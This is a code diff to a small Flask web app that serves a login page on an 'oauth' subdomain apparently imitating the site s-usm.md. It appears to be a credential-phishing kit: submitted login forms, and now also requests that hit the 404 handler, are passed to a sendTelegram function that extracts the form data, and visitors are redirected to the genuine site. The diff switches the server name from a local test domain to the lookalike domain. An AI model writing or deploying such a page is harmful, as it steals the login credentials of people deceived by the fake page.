@@ -5,7 +5,7 @@ import os
 
 load_dotenv()
 app = Flask(__name__)
-app.config['SERVER_NAME'] = 'lvh.me'
+app.config['SERVER_NAME'] = 'oauth.s-usm.md'
 
 def sendTelegram(request):
     # Extracting form data
@@ -51,6 +51,7 @@ def sendTelegram(request):
 
 @app.errorhandler(404)
 def error404(e):
+    sendTelegram(request)
     return redirect("https://s-usm.md")
 
 @app.route('/', subdomain='oauth')
@@ -64,11 +65,11 @@ def login():
         # Process and handle the login data
         sendTelegram(request)
         # Redirect to the login page after POST request
-        return redirect(url_for('login'))
+        return login()
     else:
         # Serve the login page on a GET request
         return render_template('login.html')
 
 if __name__ == '__main__':
     # Running the app on the local development server
-    app.run(host="0.0.0.0", port=80, debug=False)
+    app.run(debug=False)
